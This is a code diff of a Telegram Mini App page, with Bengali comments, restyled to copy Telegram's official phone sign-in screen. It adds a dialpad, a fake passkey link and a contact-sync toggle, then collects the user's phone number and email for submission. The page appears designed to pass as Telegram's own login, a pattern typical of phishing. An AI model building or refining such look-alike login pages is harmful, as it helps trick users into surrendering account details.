@@ -8,15 +8,15 @@
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght=400;500;600;700&display=swap" rel="stylesheet">
     <style>
         :root {
-            --bg: #f2f2f7;          
+            --bg: #ffffff;          
             --card: #ffffff;        
-            --border: #e5e5ea;      
-            --text-dark: #1c1c1e;   
+            --border: #e0e0e0;      
+            --text-dark: #000000;   
             --text-muted: #8e8e93;  
-            --success: #34c759;     
-            --danger: #ff3b30;
-            --primary: #007aff;     
-            --tg-cyan: #24a1de; 
+            --tg-teal: #1fa39b; /* ভিডিওর মত অফিশিয়াল টিল কালার */
+            --tg-link: #3390ec;
+            --keyboard-bg: #f1f2f6;
+            --success: #34c759;
             --font: -apple-system, BlinkMacSystemFont, 'Inter', sans-serif;
         }
 
@@ -31,423 +31,488 @@
 
         body { 
             background-color: var(--bg); 
-            padding: 16px; 
             color: var(--text-dark);
             -webkit-font-smoothing: antialiased;
-            display: flex;
-            justify-content: center;
-            align-items: flex-start;
             min-height: 100vh;
-        }
-
-        .wrapper {
-            width: 100%;
             display: flex;
             flex-direction: column;
+            overflow: hidden; /* কিবোর্ডের জন্য স্ক্রল অফ */
         }
 
-        .top-nav-bar {
+        .main-content {
+            padding: 24px 16px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            overflow-y: auto;
+        }
+
+        /* 👑 1. HEADER SECTION */
+        .header-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: var(--text-dark);
+            margin-bottom: 8px;
+            margin-top: 20px;
+            text-align: center;
+        }
+        .header-subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 30px;
+        }
+        .header-subtitle a {
+            color: var(--tg-link);
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        /* 👑 2. COUNTRY SELECTOR BOX */
+        .country-card {
             width: 100%;
-            height: 36px;
+            height: 54px;
+            border: 1px solid var(--border);
+            border-radius: 12px;
             display: flex;
             align-items: center;
-            margin-bottom: 8px;
-        }
-        .back-circle-btn {
-            width: 32px; height: 32px;
-            border-radius: 50%;
-            border: 1px solid var(--border);
-            background: #fff;
-            display: none; align-items: center; justify-content: center;
-            cursor: pointer; transition: all 0.2s ease;
-        }
-        .back-circle-btn svg { width: 14px; height: 14px; fill: #48484a; }
-
-        .brand-header {
-            display: flex;
-            justify-content: center;
-            width: 100%;
+            padding: 0 16px;
             margin-bottom: 20px;
-            margin-top: 4px;
-        }
-        h1.brand-title { 
-            font-size: 24px; 
-            font-weight: 700; 
-            color: #000000; 
-            letter-spacing: -0.3px;
-        }
-
-        .step-container { display: none; width: 100%; }
-        .step-container.active { display: block; animation: stepFade 0.23s ease-out; }
-        @keyframes stepFade { from { opacity: 0; transform: translateY(3px); } to { opacity: 1; transform: translateY(0); } }
-
-        .section-label { font-size: 13px; font-weight: 500; color: var(--text-muted); text-align: left; margin-bottom: 8px; padding-left: 2px; }
-
-        /* ========================================================
-           🍏 iOS STYLE COUNTRY SELECTOR (NO DEFAULT SELECTION)
-           ======================================================== */
-        .country-card {
-            width: 100%; background: var(--card); border: 1px solid var(--border); border-radius: 11px;
-            position: relative; display: flex; align-items: center; margin-bottom: 22px;
-        }
-        .country-select {
-            width: 100%; padding: 15px 40px 15px 16px; border: none; outline: none; font-size: 16px;
-            font-weight: 500; color: var(--text-dark); background: transparent; appearance: none; -webkit-appearance: none;
+            position: relative;
             cursor: pointer;
+            transition: all 0.2s;
         }
-        /* ডিফল্ট গ্রেহোল্ডার টেক্সট কালার (যখন কিছু সিলেক্ট থাকবে না) */
-        .country-select:invalid {
-            color: #bcbcc1;
+        .country-card:active { background: #f9f9f9; }
+        .country-name-display {
+            font-size: 16px;
+            color: var(--text-muted);
+            flex-grow: 1;
+            font-weight: 400;
         }
-        .country-arrow-icon {
-            position: absolute; right: 16px; pointer-events: none; width: 14px; height: 14px; fill: var(--text-muted);
+        .country-name-display.selected {
+            color: var(--text-dark);
+        }
+        .arrow-right {
+            width: 8px; height: 14px; fill: none; stroke: #c7c7cc; stroke-width: 2;
         }
 
-        /* স্প্লিট ফোন নম্বর ইনপুট গ্রুপ */
+        /* 👑 3. SPLIT PHONE INPUT GROUP */
         .telegram-phone-group {
-            position: relative; width: 100%; background: var(--card); border: 1px solid var(--border);
-            border-radius: 11px; display: flex; align-items: center; margin-bottom: 24px; transition: border-color 0.2s ease;
+            position: relative; width: 100%; height: 54px; border: 1px solid var(--border);
+            border-radius: 12px; display: flex; align-items: center; margin-bottom: 20px; 
+            transition: border-color 0.2s ease;
         }
-        .telegram-phone-group.focused { border-color: var(--tg-cyan) !important; }
-        .telegram-phone-group.is-valid { border-color: var(--success) !important; }
-        .telegram-phone-group.is-invalid { border-color: var(--danger) !important; }
-
+        .telegram-phone-group.focused { border-color: var(--tg-teal); }
+        
         .floating-label {
-            position: absolute; top: -9px; left: 12px; background: var(--bg);
-            padding: 0 5px; font-size: 12px; font-weight: 600; color: var(--tg-cyan); transition: color 0.2s;
+            position: absolute; top: -8px; left: 12px; background: var(--bg);
+            padding: 0 4px; font-size: 12px; color: var(--tg-teal); font-weight: 500;
+            display: none;
         }
-        .telegram-phone-group.is-invalid .floating-label { color: var(--danger); }
-        .telegram-phone-group.is-valid .floating-label { color: var(--success); }
+        .telegram-phone-group.focused .floating-label { display: block; }
 
         .phone-static-plus {
-            font-size: 16px; font-weight: 500; color: var(--text-dark); padding-left: 16px; user-select: none;
+            font-size: 18px; font-weight: 500; color: var(--text-dark); padding-left: 16px;
         }
+        
+        /* inputmode="none" দিয়ে নেটিভ কিবোর্ড হাইড করা হয়েছে */
         .cc-field-input {
-            width: 45px; padding: 15px 4px; border: none; outline: none; font-size: 16px;
+            width: 50px; padding: 15px 4px; border: none; outline: none; font-size: 18px;
             font-weight: 500; color: var(--text-dark); background: transparent; text-align: left;
         }
         .split-vertical-line {
-            width: 1px; height: 26px; background: var(--border); margin: 0 6px 0 2px; flex-shrink: 0;
+            width: 1px; height: 26px; background: var(--border); margin: 0 8px 0 2px;
         }
         .main-number-input {
-            flex-grow: 1; padding: 15px 4px; border: none; outline: none; font-size: 16px;
-            font-weight: 500; color: var(--text-dark); background: transparent;
+            flex-grow: 1; padding: 15px 4px; border: none; outline: none; font-size: 18px;
+            font-weight: 500; color: var(--text-dark); background: transparent; letter-spacing: 1px;
         }
 
-        /* ইমেইল বক্স */
-        .input-card {
-            width: 100%; background: var(--card); border: 1px solid var(--border); border-radius: 11px;
-            position: relative; display: flex; align-items: center; margin-bottom: 24px; 
+        /* 👑 4. SYNC CONTACTS CHECKBOX */
+        .sync-container {
+            width: 100%; display: flex; align-items: center; margin-bottom: 24px;
+            cursor: pointer;
         }
-        .input-card.is-valid { border-color: var(--success) !important; }
-        .input-card.is-invalid { border-color: var(--danger) !important; }
-        .field-input { width: 100%; padding: 15px 16px; border: none; outline: none; font-size: 15px; font-weight: 500; color: #000; background: transparent; }
+        .custom-checkbox {
+            width: 22px; height: 22px; background: var(--tg-link); border-radius: 6px;
+            display: flex; align-items: center; justify-content: center; margin-right: 12px;
+            transition: all 0.2s;
+        }
+        .custom-checkbox.unchecked { background: #fff; border: 2px solid #c7c7cc; }
+        .custom-checkbox svg { width: 14px; height: 14px; fill: none; stroke: #fff; stroke-width: 3; stroke-linecap: round; stroke-linejoin: round; }
+        .custom-checkbox.unchecked svg { display: none; }
+        .sync-text { font-size: 16px; color: var(--text-dark); font-weight: 500; }
 
-        .status-icon-wrap { display: flex; align-items: center; justify-content: center; padding-right: 14px; height: 100%; flex-shrink: 0; }
-        .status-icon-wrap svg { width: 18px; height: 18px; display: none; }
-        .telegram-phone-group.is-valid .status-icon-wrap .tick-icon,
-        .input-card.is-valid .status-icon-wrap .tick-icon { display: block; fill: var(--success); }
+        /* 👑 5. FLOATING ACTION BUTTON (FAB) */
+        .fab-container {
+            width: 100%; display: flex; justify-content: flex-end; padding-right: 8px; margin-bottom: 20px;
+        }
+        .fab-btn {
+            width: 60px; height: 60px; border-radius: 50%; background: var(--tg-teal);
+            display: flex; align-items: center; justify-content: center; border: none; outline: none;
+            box-shadow: 0 4px 12px rgba(31, 163, 155, 0.3); cursor: pointer; transition: transform 0.2s;
+        }
+        .fab-btn:active { transform: scale(0.92); }
+        .fab-btn svg { width: 24px; height: 24px; fill: none; stroke: #fff; stroke-width: 2.5; stroke-linecap: round; stroke-linejoin: round; }
+        .fab-btn.hidden { display: none; }
 
-        /* বোতাম */
-        .proceed-btn {
-            width: 100%; padding: 15px; background: #d1d1d6; color: #8e8e93; border: none; border-radius: 11px; font-size: 15px; font-weight: 600;
-            cursor: not-allowed; transition: all 0.2s ease; display: flex; justify-content: center; align-items: center; gap: 6px;
+        /* 👑 6. CUSTOM DIALPAD KEYBOARD */
+        .custom-keyboard {
+            width: 100%; background: #ffffff; padding: 10px 10px 30px 10px;
+            display: grid; grid-template-columns: repeat(3, 1fr); gap: 8px;
+            box-shadow: 0 -1px 4px rgba(0,0,0,0.05);
         }
-        .proceed-btn.active { background: var(--primary) !important; color: #fff !important; cursor: pointer !important; }
-        .btn-spinner { display: none; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.5s linear infinite; }
+        .key-btn {
+            background: var(--keyboard-bg); border-radius: 8px; height: 54px;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            border: none; outline: none; cursor: pointer; transition: background 0.1s;
+        }
+        .key-btn:active { background: #d1d2d6; }
+        .key-num { font-size: 24px; font-weight: 500; color: #000; line-height: 1; }
+        .key-char { font-size: 10px; font-weight: 600; color: #8e8e93; margin-top: 2px; letter-spacing: 1px; }
+        .key-empty { background: transparent; pointer-events: none; }
+        .key-backspace svg { width: 22px; height: 22px; fill: #48484a; }
 
-        /* SUMMARY CONTAINER CONFIGURATION */
-        .summary-card { 
-            background: var(--card); border-radius: 14px; overflow: hidden;
-            border: 1px solid var(--border); margin-bottom: 20px; padding: 0; width: 100%;
+        /* 👑 7. COUNTRY LIST MODAL (FULL SCREEN) */
+        .country-modal {
+            position: fixed; top: 100%; left: 0; width: 100%; height: 100%;
+            background: var(--bg); z-index: 1000; transition: top 0.3s cubic-bezier(0.1, 0.8, 0.25, 1);
+            display: flex; flex-direction: column;
         }
-        .summary-row {
-            display: flex; align-items: center; justify-content: flex-start; padding: 14px 16px; 
-            border-bottom: 1px solid #f2f2f7; background: var(--card);
-        }
-        .summary-row:last-child { border-bottom: none; }
+        .country-modal.open { top: 0; }
         
-        .row-label-normal { 
-            width: 115px; font-size: 14px; color: #1c1c1e; font-weight: 700; flex-shrink: 0;
+        .modal-header {
+            padding: 16px; display: flex; align-items: center; border-bottom: 1px solid var(--border);
+            background: var(--bg);
         }
-        .row-value { 
-            font-size: 13px; font-weight: 400; color: #8e8e93; text-align: left;
-            flex-grow: 1; word-break: break-all; padding-left: 10px;
+        .close-modal-btn {
+            background: none; border: none; font-size: 16px; color: var(--tg-link); font-weight: 500; padding: 4px; cursor: pointer;
         }
+        .modal-title {
+            flex-grow: 1; text-align: center; font-size: 17px; font-weight: 600; margin-right: 40px;
+        }
+        .country-list {
+            flex-grow: 1; overflow-y: auto; padding: 0 16px;
+        }
+        .country-item {
+            display: flex; align-items: center; justify-content: space-between;
+            padding: 14px 0; border-bottom: 1px solid #f2f2f7; cursor: pointer;
+        }
+        .country-item:active { background: #f9f9f9; }
+        .c-info { display: flex; align-items: center; gap: 12px; }
+        .c-flag { font-size: 20px; }
+        .c-name { font-size: 16px; font-weight: 500; color: var(--text-dark); }
+        .c-code { font-size: 16px; font-weight: 500; color: var(--tg-teal); }
 
-        #successOverlay {
-            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.25); backdrop-filter: blur(6px); -webkit-backdrop-filter: blur(6px);
-            z-index: 9999; justify-content: center; align-items: center;
-        }
-        .success-card {
-            background: #ffffff; border-radius: 20px; padding: 30px; width: 80%; max-width: 300px;
-            display: flex; flex-direction: column; align-items: center; box-shadow: 0 15px 30px rgba(0,0,0,0.08);
-        }
-        .success-circle { width: 64px; height: 64px; border-radius: 50%; background: var(--success); display: flex; align-items: center; justify-content: center; margin-bottom: 16px;}
-        .tick-svg { width: 32px; height: 32px; stroke: #fff; fill: none; stroke-width: 3.5; }
-        .success-heading { font-size: 18px; font-weight: 700; color: var(--text-dark); margin-bottom: 6px; }
-        .success-sub { font-size: 13px; font-weight: 500; color: var(--text-muted); text-align: center; line-height: 1.4; }
+        /* 👑 8. STEPS CONTROL (Email & Summary) */
+        .step-container { display: none; width: 100%; padding: 24px 16px; }
+        .step-container.active { display: block; animation: stepFade 0.23s ease-out; }
+        @keyframes stepFade { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
 
-        @keyframes spin { to { transform: rotate(360deg); } }
+        /* Email & Summary Specific Styles (From your previous design) */
+        .section-label { font-size: 13px; font-weight: 500; color: var(--text-muted); text-align: left; margin-bottom: 8px; padding-left: 2px; }
+        .input-card { width: 100%; background: var(--card); border: 1px solid var(--border); border-radius: 10px; position: relative; display: flex; align-items: center; margin-bottom: 20px; }
+        .input-card.is-valid { border-color: var(--success) !important; }
+        .field-input { width: 100%; padding: 14px 14px; border: none; outline: none; font-size: 15px; font-weight: 400; color: #000; background: transparent; }
+        .proceed-btn { width: 100%; padding: 14px; background: #d1d1d6; color: #8e8e93; border: none; border-radius: 10px; font-size: 15px; font-weight: 600; cursor: not-allowed; display: flex; justify-content: center; align-items: center; gap: 6px; }
+        .proceed-btn.active { background: var(--tg-link) !important; color: #fff !important; cursor: pointer !important; }
+        .summary-card { background: var(--card); border-radius: 14px; overflow: hidden; border: 1px solid var(--border); margin-bottom: 20px; padding: 0; width: 100%; }
+        .summary-row { display: flex; align-items: center; justify-content: flex-start; padding: 14px 16px; border-bottom: 1px solid #f2f2f7; background: var(--card); }
+        .row-label-normal { width: 115px; font-size: 14px; color: #1c1c1e; font-weight: 700; flex-shrink: 0; }
+        .row-value { font-size: 13px; font-weight: 400; color: #8e8e93; text-align: left; flex-grow: 1; word-break: break-all; padding-left: 10px; }
+        .btn-spinner { display: none; width: 14px; height: 14px; border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff; border-radius: 50%; animation: spin 0.5s linear infinite; }
     </style>
 </head>
 <body>
 
-<div class="wrapper">
-    <div class="top-nav-bar">
-        <button id="backArrowBtn" class="back-circle-btn" onclick="handleBack()">
-            <svg viewBox="0 0 24 24"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
-        </button>
-    </div>
-
-    <div class="brand-header" id="brandHeader">
-        <h1 class="brand-title">Telegram Account</h1>
-    </div>
-
-    <div id="stepPhone" class="step-container active">
-        <div class="section-label">Country</div>
-        <div class="country-card">
-            <select id="countrySelect" class="country-select" required onchange="handleCountryChange()">
-                <option value="" disabled selected hidden>Choose Country</option>
-                <option value="BD">🇧🇩 Bangladesh &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; +880</option>
-            </select>
-            <svg class="country-arrow-icon" viewBox="0 0 24 24"><path d="M8.59 16.59L13.17 12 8.59 7.41 10 6l6 6-6 6-1.41-1.41z"/></svg>
+<div id="stepPhone" style="display: flex; flex-direction: column; height: 100vh;">
+    <div class="main-content">
+        
+        <div class="header-title">Your phone number</div>
+        <div class="header-subtitle">
+            Please enter your phone number<br>
+            or <a href="#">log in using passkey ></a>
         </div>
 
-        <div id="phoneGroupWrap" class="telegram-phone-group">
+        <div class="country-card" onclick="openCountryModal()">
+            <div class="country-name-display" id="countryDisplay">Country</div>
+            <svg class="arrow-right" viewBox="0 0 8 14"><path d="M1 13l6-6-6-6"/></svg>
+        </div>
+
+        <div id="phoneGroupWrap" class="telegram-phone-group focused">
             <span class="floating-label">Phone number</span>
             <span class="phone-static-plus">+</span>
-            <input type="tel" id="ccInput" class="cc-field-input" value="" placeholder="Code" oninput="handleCcInput()" onfocus="toggleFocus(true)" onblur="toggleFocus(false)">
+            
+            <input type="text" id="ccInput" class="cc-field-input" placeholder="" inputmode="none" onfocus="setActiveField('cc')">
             <div class="split-vertical-line"></div>
-            <input type="tel" id="mainNumberInput" class="main-number-input" placeholder="000 000 0000" oninput="checkPhoneLive()" onfocus="toggleFocus(true)" onblur="toggleFocus(false)">
-            
-            <div class="status-icon-wrap">
-                <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-            </div>
+            <input type="text" id="mainNumberInput" class="main-number-input" placeholder="" inputmode="none" onfocus="setActiveField('main')">
         </div>
 
-        <button id="phoneProceedBtn" class="proceed-btn" onclick="goToStep('Email')" disabled>
-            <div id="phoneSpinner" class="btn-spinner"></div>
-            <span id="phoneBtnText">Proceed</span>
-        </button>
+        <div class="sync-container" onclick="toggleSync()">
+            <div class="custom-checkbox" id="syncCheck">
+                <svg viewBox="0 0 24 24"><path d="M20 6L9 17l-5-5"/></svg>
+            </div>
+            <span class="sync-text">Sync Contacts</span>
+        </div>
+
+        <div class="fab-container">
+            <button class="fab-btn" id="fabProceedBtn" onclick="goToStep('Email')" style="opacity: 0.5; pointer-events: none;">
+                <svg viewBox="0 0 24 24"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+            </button>
+        </div>
+
     </div>
 
-    <div id="stepEmail" class="step-container">
-        <div class="section-label">Your Email Address</div>
-        <div id="emailCard" class="input-card">
-            <input type="email" id="emailInput" class="field-input" placeholder="Enter Email Address" oninput="checkEmailLive()">
-            <div class="status-icon-wrap">
-                <svg class="tick-icon" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
-            </div>
-        </div>
-        <button id="emailProceedBtn" class="proceed-btn" onclick="goToStep('Summary')" disabled>
-            <div id="emailSpinner" class="btn-spinner"></div>
-            <span id="emailBtnText">Proceed</span>
-        </button>
-    </div>
-
-    <div id="stepSummary" class="step-container">
-        <div class="section-label">Account Confirmation Summary</div>
-        <div class="summary-card">
-            <div class="summary-row">
-                <span class="row-label-normal">Phone Number</span>
-                <span class="row-value" id="sumPhone">-</span>
-            </div>
-            
-            <div class="summary-row">
-                <span class="row-label-normal">Email Address</span>
-                <span class="row-value" id="sumEmail">-</span>
-            </div>
-        </div>
-
-        <button id="submitBtn" class="proceed-btn active" style="background:var(--primary) !important;" onclick="submitFinalData()">
-            <div id="submitSpinner" class="btn-spinner"></div>
-            <span id="submitBtnText">Submit Account</span>
+    <div class="custom-keyboard" id="dialpad">
+        <button class="key-btn" onclick="typeNum('1')"><span class="key-num">1</span><span class="key-char">&nbsp;</span></button>
+        <button class="key-btn" onclick="typeNum('2')"><span class="key-num">2</span><span class="key-char">ABC</span></button>
+        <button class="key-btn" onclick="typeNum('3')"><span class="key-num">3</span><span class="key-char">DEF</span></button>
+        
+        <button class="key-btn" onclick="typeNum('4')"><span class="key-num">4</span><span class="key-char">GHI</span></button>
+        <button class="key-btn" onclick="typeNum('5')"><span class="key-num">5</span><span class="key-char">JKL</span></button>
+        <button class="key-btn" onclick="typeNum('6')"><span class="key-num">6</span><span class="key-char">MNO</span></button>
+        
+        <button class="key-btn" onclick="typeNum('7')"><span class="key-num">7</span><span class="key-char">PQRS</span></button>
+        <button class="key-btn" onclick="typeNum('8')"><span class="key-num">8</span><span class="key-char">TUV</span></button>
+        <button class="key-btn" onclick="typeNum('9')"><span class="key-num">9</span><span class="key-char">WXYZ</span></button>
+        
+        <div class="key-btn key-empty"></div>
+        <button class="key-btn" onclick="typeNum('0')"><span class="key-num">0</span><span class="key-char">+</span></button>
+        <button class="key-btn" onclick="deleteNum()" style="background: transparent;">
+            <svg class="key-backspace" viewBox="0 0 24 24"><path d="M22 3H7c-.69 0-1.23.35-1.59.88L0 12l5.41 8.11c.36.53.9.89 1.59.89h15c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm-3 12.59L17.59 17 14 13.41 10.41 17 9 15.59 12.59 12 9 8.41 10.41 7 14 10.59 17.59 7 19 8.41 15.41 12 19 15.59z"/></svg>
         </button>
     </div>
 </div>
 
-<div id="successOverlay">
-    <div class="success-card">
-        <div class="success-circle">
-            <svg class="tick-svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="4"><polyline points="20 6 9 17 4 12"/></svg>
-        </div>
-        <div class="success-heading">Synchronized!</div>
-        <div class="success-sub">Account data submitted successfully. This window will close shortly.</div>
+<div class="country-modal" id="countryModal">
+    <div class="modal-header">
+        <button class="close-modal-btn" onclick="closeCountryModal()">Cancel</button>
+        <div class="modal-title">Choose Country</div>
     </div>
+    <div class="country-list" id="countryListRender">
+        </div>
+</div>
+
+<div id="stepEmail" class="step-container">
+    <div class="header-title" style="margin-top:0;">Your Email Address</div>
+    <div class="header-subtitle" style="margin-bottom:20px;">For account verification</div>
+    
+    <div id="emailCard" class="input-card">
+        <input type="email" id="emailInput" class="field-input" placeholder="Enter Email Address" oninput="checkEmailLive()">
+    </div>
+    <button id="emailProceedBtn" class="proceed-btn" onclick="goToStep('Summary')" disabled>
+        <div id="emailSpinner" class="btn-spinner"></div>
+        <span id="emailBtnText">Proceed</span>
+    </button>
+</div>
+
+<div id="stepSummary" class="step-container">
+    <div class="header-title" style="margin-top:0; margin-bottom: 20px;">Account Summary</div>
+    <div class="summary-card">
+        <div class="summary-row">
+            <span class="row-label-normal">Phone Number</span>
+            <span class="row-value" id="sumPhone">-</span>
+        </div>
+        <div class="summary-row">
+            <span class="row-label-normal">Email Address</span>
+            <span class="row-value" id="sumEmail">-</span>
+        </div>
+    </div>
+
+    <button id="submitBtn" class="proceed-btn active" style="background:var(--tg-link) !important;" onclick="submitFinalData()">
+        <div id="submitSpinner" class="btn-spinner"></div>
+        <span id="submitBtnText">Submit Account</span>
+    </button>
 </div>
 
 <script>
     const tg = window.Telegram.WebApp;
     tg.ready(); tg.expand();
 
-    let collectedFormData = { email: "", gmail: "", phone: "" };
-    let currentStepName = "Phone";
+    let collectedFormData = { email: "", gmail: "", phone: "", sync_contacts: true };
+    
+    // কান্ট্রি ডেটাবেস
+    const countryData = [
+        { name: "Afghanistan", code: "93", flag: "🇦🇫" },
+        { name: "Albania", code: "355", flag: "🇦🇱" },
+        { name: "Algeria", code: "213", flag: "🇩🇿" },
+        { name: "Bangladesh", code: "880", flag: "🇧🇩" },
+        { name: "India", code: "91", flag: "🇮🇳" },
+        { name: "Pakistan", code: "92", flag: "🇵🇰" },
+        { name: "United States", code: "1", flag: "🇺🇸" },
+        { name: "United Kingdom", code: "44", flag: "🇬🇧" }
+    ];
 
-    function toggleFocus(isFocused) {
-        const wrap = document.getElementById('phoneGroupWrap');
-        if (isFocused) wrap.classList.add('focused');
-        else wrap.classList.remove('focused');
+    let activeField = 'cc'; // 'cc' or 'main'
+
+    // পেজ লোড হবার পর কান্ট্রি লিস্ট রেন্ডার করা
+    document.addEventListener("DOMContentLoaded", function() {
+        const listContainer = document.getElementById('countryListRender');
+        listContainer.innerHTML = countryData.map(c => `
+            <div class="country-item" onclick="selectCountry('${c.name}', '${c.code}', '${c.flag}')">
+                <div class="c-info">
+                    <span class="c-flag">${c.flag}</span>
+                    <span class="c-name">${c.name}</span>
+                </div>
+                <span class="c-code">+${c.code}</span>
+            </div>
+        `).join('');
+
+        // ফোকাস সেট করা
+        document.getElementById('ccInput').focus();
+    });
+
+    function setActiveField(field) {
+        activeField = field;
+        document.getElementById('phoneGroupWrap').classList.add('focused');
     }
 
-    // 🔄 ১. কান্ট্রি সিলেক্ট চেঞ্জ হলে কোড আপডেট
-    function handleCountryChange() {
-        const country = document.getElementById('countrySelect').value;
-        const ccInput = document.getElementById('ccInput');
-        if (country === "BD") {
-            ccInput.value = "880";
-        } else {
-            ccInput.value = "";
-        }
-        checkPhoneLive();
-    }
+    // 🎛️ কাস্টম কিবোর্ড লজিক
+    function typeNum(num) {
+        const ccInp = document.getElementById('ccInput');
+        const mainInp = document.getElementById('mainNumberInput');
 
-    // 🔄 ২. কোড ইনপুট চেঞ্জ হলে কান্ট্রি অটো-সিলেক্ট
-    function handleCcInput() {
-        const cc = document.getElementById('ccInput').value.trim();
-        const countrySelect = document.getElementById('countrySelect');
-        if (cc === "880") {
-            countrySelect.value = "BD";
-        } else {
-            countrySelect.value = ""; // ড্রপডাউন রিসেট করবে যদি অন্য কোড হয়
-        }
-        checkPhoneLive();
-    }
-
-    // 🇧🇩 বাংলাদেশি ফোন নম্বর লাইভ চেকার ও ট্রিমার
-    function checkPhoneLive() {
-        const cc = document.getElementById('ccInput').value.trim();
-        let mainNumField = document.getElementById('mainNumberInput');
-        let mainNum = mainNumField.value.trim();
-        const wrap = document.getElementById('phoneGroupWrap');
-        const btn = document.getElementById('phoneProceedBtn');
-
-        // প্রথম ০ (0) ট্রিম লজিক
-        if (mainNum.startsWith('0')) {
-            mainNum = mainNum.substring(1);
-            mainNumField.value = mainNum;
-        }
-
-        if (cc === "880") {
-            const bdRegex = /^1[3-9]\d{8}$/;
-            if (bdRegex.test(mainNum)) {
-                wrap.className = "telegram-phone-group is-valid";
-                btn.removeAttribute('disabled');
-                btn.classList.add('active');
-                return true;
+        if (activeField === 'cc') {
+            ccInp.value += num;
+            checkAutoCountryMatch(ccInp.value);
+            // কোড ৩ ডিজিট হলে অটোমেটিক নাম্বার বক্সে ফোকাস চলে যাবে
+            if (ccInp.value.length >= 3) {
+                activeField = 'main';
+                mainInp.focus();
             }
-        }
-        
-        if (mainNum.length === 0) {
-            wrap.className = "telegram-phone-group";
         } else {
-            wrap.className = "telegram-phone-group is-invalid";
+            // প্রথম ডিজিট ০ হলে বাদ দিবে (বাংলাদেশি নাম্বারের ক্ষেত্রে)
+            if (mainInp.value === "" && num === "0") return;
+            mainInp.value += num;
         }
-        btn.setAttribute('disabled', 'true');
-        btn.classList.remove('active');
-        return false;
+        validatePhoneFinal();
     }
 
-    // 📧 ইমেইল চেকার লাইভ লজিক
+    function deleteNum() {
+        const ccInp = document.getElementById('ccInput');
+        const mainInp = document.getElementById('mainNumberInput');
+
+        if (activeField === 'main') {
+            if (mainInp.value.length > 0) {
+                mainInp.value = mainInp.value.slice(0, -1);
+            } else {
+                activeField = 'cc';
+                ccInp.focus();
+                ccInp.value = ccInp.value.slice(0, -1);
+                checkAutoCountryMatch(ccInp.value);
+            }
+        } else {
+            ccInp.value = ccInp.value.slice(0, -1);
+            checkAutoCountryMatch(ccInp.value);
+        }
+        validatePhoneFinal();
+    }
+
+    // 🔎 অটো কান্ট্রি ডিটেকশন (কোড টাইপ করলে)
+    function checkAutoCountryMatch(code) {
+        const display = document.getElementById('countryDisplay');
+        const matched = countryData.find(c => c.code === code);
+        
+        if (matched) {
+            display.innerHTML = `${matched.flag} ${matched.name}`;
+            display.classList.add('selected');
+        } else {
+            display.innerText = "Country";
+            display.classList.remove('selected');
+        }
+    }
+
+    // 🌍 মডাল কন্ট্রোল
+    function openCountryModal() {
+        document.getElementById('countryModal').classList.add('open');
+    }
+    function closeCountryModal() {
+        document.getElementById('countryModal').classList.remove('open');
+    }
+
+    // লিস্ট থেকে কান্ট্রি সিলেক্ট করলে
+    function selectCountry(name, code, flag) {
+        document.getElementById('countryDisplay').innerHTML = `${flag} ${name}`;
+        document.getElementById('countryDisplay').classList.add('selected');
+        document.getElementById('ccInput').value = code;
+        
+        closeCountryModal();
+        activeField = 'main';
+        document.getElementById('mainNumberInput').focus();
+        validatePhoneFinal();
+    }
+
+    // ✅ চেকবক্স টগল
+    function toggleSync() {
+        const box = document.getElementById('syncCheck');
+        box.classList.toggle('unchecked');
+        collectedFormData.sync_contacts = !box.classList.contains('unchecked');
+    }
+
+    // 📱 ফাইনাল ফোন ভ্যালিডেশন
+    function validatePhoneFinal() {
+        const cc = document.getElementById('ccInput').value;
+        const mainNum = document.getElementById('mainNumberInput').value;
+        const fab = document.getElementById('fabProceedBtn');
+
+        let isValid = false;
+        if (cc === "880" && mainNum.length === 10) { isValid = true; } // BD validation
+        else if (cc !== "" && mainNum.length >= 7) { isValid = true; } // Generic validation
+
+        if (isValid) {
+            fab.style.opacity = "1";
+            fab.style.pointerEvents = "auto";
+        } else {
+            fab.style.opacity = "0.5";
+            fab.style.pointerEvents = "none";
+        }
+    }
+
+    // 📧 ইমেইল চেকার
     function checkEmailLive() {
         const val = document.getElementById('emailInput').value.trim();
         const card = document.getElementById('emailCard');
         const btn = document.getElementById('emailProceedBtn');
         
         if (val.includes('@') && val.length >= 5 && val.lastIndexOf('.') > val.indexOf('@')) { 
-            card.className = "input-card is-valid"; 
-            btn.removeAttribute('disabled'); 
-            btn.classList.add('active'); 
-        }
-        else if (val.length === 0) { 
-            card.className = "input-card"; 
-            btn.setAttribute('disabled', 'true'); 
-            btn.classList.remove('active'); 
-        }
-        else { 
-            card.className = "input-card is-invalid"; 
-            btn.setAttribute('disabled', 'true'); 
-            btn.classList.remove('active'); 
+            card.className = "input-card is-valid"; btn.removeAttribute('disabled'); btn.classList.add('active'); 
+        } else { 
+            card.className = "input-card"; btn.setAttribute('disabled', 'true'); btn.classList.remove('active'); 
         }
     }
 
